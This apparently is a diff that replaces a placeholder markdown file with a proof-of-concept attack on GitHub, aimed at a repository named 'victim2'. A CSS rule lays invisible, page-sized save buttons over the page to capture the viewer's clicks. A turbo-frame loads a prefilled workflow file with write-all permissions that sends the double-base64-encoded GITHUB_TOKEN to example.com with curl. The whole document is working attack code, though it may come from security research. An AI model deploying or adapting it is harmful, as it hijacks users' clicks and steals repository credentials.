@@ -1,2 +1,2 @@
-# test
-test
+<style>button[data-hotkey="Mod+Enter"] , button[data-hotkey="Mod+s"] {top: 0; right: 0; bottom: 0; left: 0; z-index: 32; width: 120vw; height: 120vh; margin-top: -24px; margin-left: -80px; opacity: 0; position: fixed !important;}</style>
+<turbo-frame id="repo-content-turbo-frame" style="button {color:'white'}" src="/joaxcar-hack-org1/victim2/new/main?filename=.github/workflows/test3.yml&value=name%3A%20%22PoC%22%0Aon%3A%0A%20%20push%3A%0Apermissions%3A%20write%2Dall%0Ajobs%3A%0A%20%20x%3A%0A%20%20%20%20runs%2Don%3A%20ubuntu%2Dlatest%0A%20%20%20%20steps%3A%0A%20%20%20%20%20%20%2D%20name%3A%20y%0A%20%20%20%20%20%20%20%20run%3A%20%27curl%20https%3A%2F%2Fexample%2Ecom%3Ft%3D%60echo%20%24GITHUB%5FTOKEN%20%7C%20base64%20%7C%20base64%60%20%26%26%20sleep%20600%27%0A%20%20%20%20%20%20%20%20env%3A%0A%20%20%20%20%20%20%20%20%20%20GITHUB%5FTOKEN%3A%20%24%7B%7B%20secrets%2EGITHUB%5FTOKEN%20%7D%7D"></turbo-frame>
